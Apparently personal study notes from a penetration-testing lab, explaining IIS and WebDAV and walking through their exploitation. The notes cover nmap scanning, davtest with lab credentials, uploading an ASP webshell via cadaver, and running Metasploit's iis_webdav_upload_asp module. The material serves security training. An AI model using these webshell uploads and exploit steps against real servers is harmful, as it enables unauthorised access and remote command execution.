#### IIS 
- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
- It can be used to ***host websites/web apps*** and provides administrators with a robust GUI for managing websites.
- IIS can be used to ***host static and dynamic web pages*** developed in ASP.NET and PHP.
- Typically configured to run on ports 80/443.
- Supported executable file extensions:
	- .asp
	- .aspx
	- .config
	- .php

#### WebDAV
- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
- WebDAV essentially enables a web server to function as a file server for collaborative authoring.
- WebDAV runs on top Microsoft IIS on port 80/443.
- In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

#### WebDAV Exploitation
- The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
- We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
- After obtaining legitimate creds, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

#### Tools
- **davtest** - used to scan, authenticate and exploit a WebDAV server.
- **cadaver** - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV server.

***
***
# Practical

##### Scan against the target
```
nmap target
nmap -p80 -sV --script http-enum target 
```

##### davtest tool 
If the /WebDAV path is secured with basic authentication, we will receive 401 error.
```
davtest -url http://target/webdav
davtest -auth bob:password_123321 -url http://target/webdav
```

##### cadaver tool 
Upload a .asp backdoor on the target machine
```
cadaver http://target/webdav
```

##### asp webshells
Pre-made backdoors are present in '/usr/share/webshells/asp/' 
```
put /usr/share/webshells/asp/webshell.asp
```

Access the backdoor using the Firefox browser.

```
type C:\flag.txt
```

***
### Metasploit
##### Scan the target
```
nmap -sV Target
nmap -p80 -sV --script http-enum target
```

We have found the WebDAV directory with 401 error (password protected).
Note: If http-enum script would take longer than expected then run **dirb** tool to find WebDAV directory.
**Command: dirb target**
##### Davtest tool
```
davtest -url http://target/webdav
```

We can see the `/webdav` path is secured with basic authentication.

##### Msfconsole
```
search iis_webdav
use exploit/windows/iis/iis_webdav_upload_asp
options
set httpusername bob
set httppassword password_123321
set rhosts demo.ine.local
set path /webdav/metasploit%RAND%.asp
run
```